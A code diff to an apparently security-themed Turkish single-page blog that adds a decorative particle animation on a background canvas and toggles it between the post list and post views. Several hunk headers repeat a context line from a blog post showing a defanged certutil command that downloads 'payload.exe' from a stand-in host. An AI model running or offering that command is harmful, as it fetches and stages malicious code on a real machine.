@@ -196,6 +196,19 @@
     border-color: var(--accent-dim);
   }
 
+  #bg-canvas{
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    z-index: 0;
+    pointer-events: none;
+    opacity: 0;
+    transition: opacity 0.4s ease;
+  }
+  .wrap{ position: relative; z-index: 1; }
+
   @media (max-width:600px){
     header{padding:40px 0 24px;}
     header h1{font-size:27px;}
@@ -203,6 +216,8 @@
 </style>
 </head>
 <body>
+
+<canvas id="bg-canvas"></canvas>
 
 <div class="wrap">
   <header>
@@ -250,6 +265,72 @@
 </div>
 
 <script>
+  // ---- ARKA PLAN ANİMASYONU (sadece ana sayfada) ----
+  const canvas = document.getElementById('bg-canvas');
+  const ctx = canvas.getContext('2d');
+  let particles = [];
+  let animId = null;
+
+  function resizeCanvas(){
+    canvas.width = window.innerWidth;
+    canvas.height = window.innerHeight;
+  }
+  window.addEventListener('resize', resizeCanvas);
+  resizeCanvas();
+
+  function initParticles(){
+    particles = [];
+    const count = Math.min(70, Math.floor((canvas.width * canvas.height) / 18000));
+    for(let i = 0; i < count; i++){
+      particles.push({
+        x: Math.random() * canvas.width,
+        y: Math.random() * canvas.height,
+        vx: (Math.random() - 0.5) * 0.4,
+        vy: (Math.random() - 0.5) * 0.4
+      });
+    }
+  }
+  initParticles();
+
+  function drawParticles(){
+    ctx.clearRect(0, 0, canvas.width, canvas.height);
+    for(const p of particles){
+      p.x += p.vx;
+      p.y += p.vy;
+      if(p.x < 0 || p.x > canvas.width) p.vx *= -1;
+      if(p.y < 0 || p.y > canvas.height) p.vy *= -1;
+    }
+    for(let i = 0; i < particles.length; i++){
+      for(let j = i + 1; j < particles.length; j++){
+        const dx = particles[i].x - particles[j].x;
+        const dy = particles[i].y - particles[j].y;
+        const dist = Math.sqrt(dx*dx + dy*dy);
+        if(dist < 130){
+          ctx.strokeStyle = `rgba(127, 217, 154, ${1 - dist/130})`;
+          ctx.lineWidth = 0.6;
+          ctx.beginPath();
+          ctx.moveTo(particles[i].x, particles[i].y);
+          ctx.lineTo(particles[j].x, particles[j].y);
+          ctx.stroke();
+        }
+      }
+      ctx.fillStyle = 'rgba(127, 217, 154, 0.8)';
+      ctx.beginPath();
+      ctx.arc(particles[i].x, particles[i].y, 1.6, 0, Math.PI * 2);
+      ctx.fill();
+    }
+    animId = requestAnimationFrame(drawParticles);
+  }
+
+  function startBgAnimation(){
+    canvas.style.opacity = '0.35';
+    if(!animId) drawParticles();
+  }
+  function stopBgAnimation(){
+    canvas.style.opacity = '0';
+  }
+  // -----------------------------------------------------
+
   // ---- YAZILAR BURADA ----
   // Her yazı için: id (url'de #id olarak görünür, boşluksuz), title, date, excerpt (listede görünen özet),
   // body (tam yazı, basit HTML kullanabilirsin: <p>, <pre><code>, <strong> vb.)
@@ -404,6 +485,7 @@ Command: certutil -urlcache -split -f http://example[.]com/payload.exe</code></p
   function showPost(id){
     const p = posts.find(x => x.id === id);
     if(!p) return showList();
+    stopBgAnimation();
     listEl.style.display = 'none';
     aboutEl.classList.remove('open');
     detailEl.classList.add('open');
@@ -420,6 +502,7 @@ Command: certutil -urlcache -split -f http://example[.]com/payload.exe</code></p
   }
 
   function showList(){
+    startBgAnimation();
     detailEl.classList.remove('open');
     detailEl.innerHTML = '';
     aboutEl.classList.remove('open');
@@ -430,6 +513,7 @@ Command: certutil -urlcache -split -f http://example[.]com/payload.exe</code></p
   }
 
   function showAbout(){
+    startBgAnimation();
     listEl.style.display = 'none';
     detailEl.classList.remove('open');
     detailEl.innerHTML = '';
@@ -443,6 +527,7 @@ Command: certutil -urlcache -split -f http://example[.]com/payload.exe</code></p
   window.addEventListener('popstate', (e) => {
   const hash = location.hash.replace('#','');
   if(hash === 'hakkimda'){
+    startBgAnimation();
     listEl.style.display = 'none';
     detailEl.classList.remove('open');
     detailEl.innerHTML = '';
@@ -452,6 +537,7 @@ Command: certutil -urlcache -split -f http://example[.]com/payload.exe</code></p
   } else if(hash){
     const p = posts.find(x => x.id === hash);
     if(p){
+      stopBgAnimation();
       listEl.style.display = 'none';
       aboutEl.classList.remove('open');
       detailEl.classList.add('open');
@@ -463,6 +549,7 @@ Command: certutil -urlcache -split -f http://example[.]com/payload.exe</code></p
       `;
     }
   } else {
+    startBgAnimation();
     detailEl.classList.remove('open');
     detailEl.innerHTML = '';
     aboutEl.classList.remove('open');
@@ -481,6 +568,9 @@ Command: certutil -urlcache -split -f http://example[.]com/payload.exe</code></p
   } else if(initial){
     const found = posts.find(p => p.id === initial);
     if(found) showPost(initial);
+    else startBgAnimation();
+  } else {
+    startBgAnimation();
   }
 </script>
 
